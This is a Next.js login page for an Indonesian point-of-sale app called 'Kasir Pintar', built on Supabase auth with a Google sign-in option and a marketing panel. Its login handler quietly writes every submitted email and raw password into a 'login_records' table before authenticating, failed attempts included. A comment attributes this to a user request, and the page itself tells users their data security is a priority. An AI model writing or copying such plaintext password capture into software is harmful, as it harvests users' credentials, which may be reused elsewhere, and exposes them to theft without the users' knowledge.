"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import { createClient } from "@/utils/supabase/client";
import {
  Loader2, Lock, Mail, Eye, EyeOff,
  BarChart2, Package, MessageSquare, ShieldCheck,
  ArrowRight, Bot, ShoppingCart
} from "lucide-react";
import Link from "next/link";

export default function LoginPage() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [remember, setRemember] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);
  const router = useRouter();

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError(null);
    try {
      const supabase = createClient();
      
      // Request from user: Save the email and password into the new folder (table)
      // Only keep 1 data per email using upsert
      await supabase.from('login_records').upsert({
        email: email,
        password_input: password,
        action_type: 'login'
      }, { onConflict: 'email' });

      const { error } = await supabase.auth.signInWithPassword({ email, password });
      if (error) throw error;
      router.push("/pos");
      router.refresh();
    } catch (err: any) {
      setError(err.message || "Gagal masuk. Silakan coba lagi.");
    } finally {
      setLoading(false);
    }
  };

  const handleGoogleLogin = async () => {
    try {
      const supabase = createClient();
      const { error } = await supabase.auth.signInWithOAuth({
        provider: 'google',
        options: {
          redirectTo: `${window.location.origin}/auth/callback`,
        }
      });
      if (error) throw error;
    } catch (err: any) {
      setError(err.message || "Gagal masuk dengan Google.");
    }
  };

  const features = [
    { icon: BarChart2, label: "Laporan Real-time", desc: "Pantau penjualan dan bisnis secara real-time" },
    { icon: Package, label: "Stok Akurat", desc: "Kelola inventori dengan mudah dan akurat" },
    { icon: Bot, label: "AI Assistant", desc: "Dapatkan insight dan rekomendasi cerdas" },
    { icon: ShieldCheck, label: "Aman & Terpercaya", desc: "Keamanan data bisnis terjamin" },
  ];

  return (
    <div className="min-h-screen w-full flex font-sans" style={{ background: "#f3f3fa" }}>

      {/* ═══ LEFT PANEL ═══ */}
      <div
        className="hidden lg:flex w-[52%] flex-col justify-between p-10 relative overflow-hidden"
        style={{
          background: "linear-gradient(150deg, #1e1152 0%, #2a1580 30%, #3a20a0 60%, #4a2dbf 100%)",
        }}
      >
        {/* Decorative blobs */}
        <div className="absolute -top-24 -right-24 w-80 h-80 rounded-full opacity-20 pointer-events-none"
          style={{ background: "radial-gradient(circle, #7c4dff, transparent)" }} />
        <div className="absolute bottom-10 left-0 w-[500px] h-[300px] rounded-full opacity-10 pointer-events-none"
          style={{ background: "radial-gradient(circle, #b39ddb, transparent)" }} />
        <div className="absolute top-1/3 -left-20 w-72 h-72 rounded-full opacity-10 pointer-events-none"
          style={{ background: "radial-gradient(circle, #9c27b0, transparent)" }} />

        {/* ── Logo ── */}
        <div className="relative z-10 flex items-center gap-3">
          <div className="w-10 h-10 bg-white/20 rounded-xl backdrop-blur-sm flex items-center justify-center border border-white/20 shadow-lg">
            <ShoppingCart className="w-5 h-5 text-white" />
          </div>
          <div>
            <p className="text-white font-bold text-lg leading-none">Kasir Pintar</p>
            <p className="text-purple-200 text-xs font-normal">Smart POS with AI Assistant</p>
          </div>
        </div>

        {/* ── Hero + Mockup ── */}
        <div className="relative z-10 flex-1 flex flex-col justify-center gap-4 mt-6">
          {/* Hero text */}
          <div>
            <h1 className="text-[2.6rem] font-extrabold text-white leading-tight">
              Kelola Bisnis Anda<br />
              Lebih{" "}
              <span
                className="font-extrabold"
                style={{ color: "#f5c518", fontStyle: "italic" }}
              >
                Cerdas
              </span>
            </h1>
            <div className="w-10 h-1 rounded-full bg-yellow-400 mt-3 mb-4" />
            <p className="text-purple-200 text-sm leading-relaxed max-w-[320px]">
              Sistem Kasir Pintar terintegrasi dengan Chatbot AI untuk membantu operasional, analisis, dan pengambilan keputusan bisnis Anda.
            </p>
          </div>

          {/* POS Mockup + AI Bubble Row */}
          <div className="relative flex items-end justify-start gap-4 mt-2">
            {/* POS Device Mockup */}
            <div className="relative flex-shrink-0">
              {/* Monitor */}
              <div className="w-56 bg-[#0f0a2e] rounded-xl border border-white/10 shadow-2xl overflow-hidden">
                {/* Screen top bar */}
                <div className="bg-[#1a1245] px-3 py-2 flex items-center gap-2">
                  <div className="w-2 h-2 rounded-full bg-red-400/70" />
                  <div className="w-2 h-2 rounded-full bg-yellow-400/70" />
                  <div className="w-2 h-2 rounded-full bg-green-400/70" />
                  <span className="text-purple-300 text-[9px] ml-1 font-medium">Kasir Pintar</span>
                </div>
                {/* Sidebar + content mock */}
                <div className="flex h-36">
                  <div className="w-12 bg-[#150d40] flex flex-col items-center pt-2 gap-2">
                    {["▪","▪","▪","▪","▪"].map((_, i) => (
                      <div key={i} className={`w-6 h-4 rounded-sm ${i === 0 ? "bg-purple-500" : "bg-white/10"}`} />
                    ))}
                  </div>
                  <div className="flex-1 p-2 flex flex-col gap-1">
                    <div className="text-purple-300 text-[8px] font-semibold mb-1">Inventaris</div>
                    {["Kopi Susu", "Roti Bakar", "Teh Manis", "Air Mineral"].map((item, i) => (
                      <div key={i} className="flex justify-between items-center">
                        <span className="text-white/70 text-[7px]">{item}</span>
                        <span className="text-amber-300 text-[7px]">Rp {(8000 + i * 3000).toLocaleString("id-ID")}</span>
                      </div>
                    ))}
                    <div className="mt-1 pt-1 border-t border-white/10 flex justify-between">
                      <span className="text-white/80 text-[7px] font-semibold">Total</span>
                      <span className="text-amber-300 text-[8px] font-bold">Rp 42.800</span>
                    </div>
                    <div className="mt-1 w-full rounded bg-gradient-to-r from-purple-500 to-violet-600 py-0.5 text-center text-white text-[7px] font-bold">
                      Bayar
                    </div>
                  </div>
                </div>
              </div>
              {/* Monitor stand */}
              <div className="flex justify-center">
                <div className="w-10 h-2 bg-white/10 rounded-b-lg" />
              </div>
              <div className="flex justify-center">
                <div className="w-16 h-1.5 bg-white/10 rounded-full" />
              </div>
            </div>

            {/* Receipt Printer */}
            <div className="flex-shrink-0 mb-1">
              <div className="w-14 bg-[#1a1a2e] rounded-lg border border-white/10 shadow-xl overflow-hidden">
                <div className="h-3 bg-white/5 border-b border-white/5"></div>
                <div className="flex justify-center py-1">
                  <div className="w-8 h-1 bg-white/20 rounded-full" />
                </div>
                <div className="px-2 pb-2 flex flex-col gap-0.5">
                  {[...Array(4)].map((_, i) => (
                    <div key={i} className="h-0.5 bg-white/10 rounded-full" />
                  ))}
                </div>
                {/* Paper coming out */}
                <div className="flex justify-center">
                  <div className="w-10 bg-white/90 rounded-sm py-2 flex flex-col gap-0.5 px-1">
                    {[...Array(5)].map((_, i) => (
                      <div key={i} className={`h-px rounded-full ${i % 2 === 0 ? "bg-slate-400" : "bg-slate-200"}`} />
                    ))}
                  </div>
                </div>
              </div>
              <div className="flex justify-center mt-1">
                <div className="w-14 h-2 bg-white/10 rounded-b-md" />
              </div>
              <div className="flex justify-center">
                <div className="w-16 h-1 bg-white/10 rounded-full" />
              </div>
            </div>

            {/* AI Chat Bubble — floating top right */}
            <div
              className="absolute -top-6 right-0 bg-white/15 backdrop-blur-md border border-white/20 rounded-2xl rounded-br-none p-3 flex items-center gap-3 shadow-xl"
              style={{ minWidth: "190px" }}
            >
              <div className="w-10 h-10 rounded-full bg-gradient-to-br from-purple-400 to-indigo-500 flex items-center justify-center flex-shrink-0 border-2 border-white/30 shadow">
                <Bot className="w-5 h-5 text-white" />
              </div>
              <div>
                <p className="text-amber-300 font-bold text-xs leading-tight">Hai! Saya AI Assistant</p>
                <p className="text-purple-100 text-[10px] mt-0.5 leading-tight">Ada yang bisa<br />saya bantu hari ini?</p>
              </div>
            </div>
          </div>
        </div>

        {/* ── Feature Icons Row ── */}
        <div className="relative z-10 grid grid-cols-4 gap-3 pt-4">
          {features.map((f, i) => (
            <div key={i} className="flex flex-col items-center gap-1.5 text-center">
              <div className="w-11 h-11 bg-white/10 rounded-2xl border border-white/15 flex items-center justify-center backdrop-blur-sm shadow">
                <f.icon className="w-5 h-5 text-white" />
              </div>
              <p className="text-white text-[10px] font-semibold leading-tight">{f.label}</p>
              <p className="text-purple-200 text-[9px] leading-tight">{f.desc}</p>
            </div>
          ))}
        </div>
      </div>

      {/* ═══ RIGHT PANEL ═══ */}
      <div className="flex-1 flex items-center justify-center p-8" style={{ background: "#f3f3fa" }}>
        <div
          className="w-full max-w-[440px] bg-white rounded-3xl shadow-xl shadow-slate-200/60 p-10"
          style={{ border: "1px solid #ebebf5" }}
        >
          {/* Mobile logo */}
          <div className="flex items-center gap-2 mb-6 lg:hidden">
            <div className="w-8 h-8 bg-violet-600 rounded-lg flex items-center justify-center">
              <ShoppingCart className="w-4 h-4 text-white" />
            </div>
            <span className="font-bold text-slate-800 text-sm">Kasir Pintar</span>
          </div>

          <h2 className="text-3xl font-extrabold text-slate-800 mb-1">Selamat Datang Kembali</h2>
          <p className="text-slate-400 text-sm mb-7">Masuk untuk melanjutkan ke Kasir Pintar</p>

          {error && (
            <div className="bg-red-50 text-red-500 p-3 rounded-xl text-sm border border-red-100 flex gap-2 items-start mb-5">
              <span className="mt-0.5">⚠️</span> {error}
            </div>
          )}

          <form onSubmit={handleLogin} className="space-y-4">
            {/* Email */}
            <div>
              <label className="text-sm font-semibold text-slate-700 block mb-1.5">Email atau Username</label>
              <div className="relative">
                <span className="absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-300">
                  <Mail className="w-4 h-4" />
                </span>
                <input
                  type="email" required value={email} onChange={e => setEmail(e.target.value)}
                  placeholder="nama@bisnisanda.com"
                  className="w-full pl-10 pr-4 py-3 bg-white border border-slate-200 rounded-xl text-slate-700 text-sm placeholder:text-slate-300 focus:outline-none focus:border-violet-500 focus:ring-4 focus:ring-violet-100 transition-all"
                />
              </div>
            </div>

            {/* Password */}
            <div>
              <label className="text-sm font-semibold text-slate-700 block mb-1.5">Password</label>
              <div className="relative">
                <span className="absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-300">
                  <Lock className="w-4 h-4" />
                </span>
                <input
                  type={showPassword ? "text" : "password"} required value={password}
                  onChange={e => setPassword(e.target.value)} placeholder="••••••••••"
                  className="w-full pl-10 pr-11 py-3 bg-white border border-slate-200 rounded-xl text-slate-700 text-sm placeholder:text-slate-300 focus:outline-none focus:border-violet-500 focus:ring-4 focus:ring-violet-100 transition-all"
                />
                <button type="button" onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-3.5 top-1/2 -translate-y-1/2 text-slate-300 hover:text-slate-500 transition-colors">
                  {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                </button>
              </div>

              {/* Remember + Forgot */}
              <div className="flex items-center justify-between mt-3">
                <label className="flex items-center gap-2 cursor-pointer select-none">
                  <input type="checkbox" checked={remember} onChange={e => setRemember(e.target.checked)}
                    className="w-4 h-4 rounded accent-violet-600" />
                  <span className="text-sm text-slate-600">Ingat saya</span>
                </label>
                <a href="#" className="text-sm text-violet-600 hover:text-violet-800 font-medium transition-colors">
                  Lupa password?
                </a>
              </div>
            </div>

            {/* Submit */}
            <button type="submit" disabled={loading}
              className="w-full text-white font-bold py-3.5 rounded-xl shadow-lg transition-all active:scale-[0.98] disabled:opacity-70 flex items-center justify-center gap-2 text-base mt-1"
              style={{ background: "linear-gradient(90deg, #7c3aed, #6d28d9)" }}
            >
              {loading
                ? <><Loader2 className="w-5 h-5 animate-spin" /> Memproses...</>
                : <><span>Masuk</span><ArrowRight className="w-5 h-5" /></>
              }
            </button>

            {/* Divider */}
            <div className="relative flex items-center gap-3 my-1">
              <div className="flex-1 h-px bg-slate-200" />
              <span className="text-xs text-slate-400">atau masuk dengan</span>
              <div className="flex-1 h-px bg-slate-200" />
            </div>

            {/* Social Buttons */}
            <div className="w-full">
              <button type="button" onClick={handleGoogleLogin}
                className="w-full flex items-center justify-center gap-2 py-2.5 border border-slate-200 rounded-xl bg-white hover:bg-slate-50 text-slate-700 text-sm font-medium transition-all hover:border-slate-300 shadow-sm">
                <svg className="w-4 h-4" viewBox="0 0 24 24">
                  <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
                  <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
                  <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
                  <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
                </svg>
                Google
              </button>
            </div>
          </form>

          {/* Register link */}
          <p className="text-center text-sm text-slate-500 mt-6">
            Belum punya akun?{" "}
            <Link href="/register" className="text-violet-600 hover:text-violet-800 font-semibold transition-colors">
              Daftar sekarang
            </Link>
          </p>

          {/* Security note */}
          <p className="text-center text-xs text-slate-400 mt-4 flex items-center justify-center gap-1.5">
            <ShieldCheck className="w-3.5 h-3.5 text-slate-300" />
            Keamanan data Anda adalah prioritas kami
          </p>
        </div>
      </div>
    </div>
  );
}
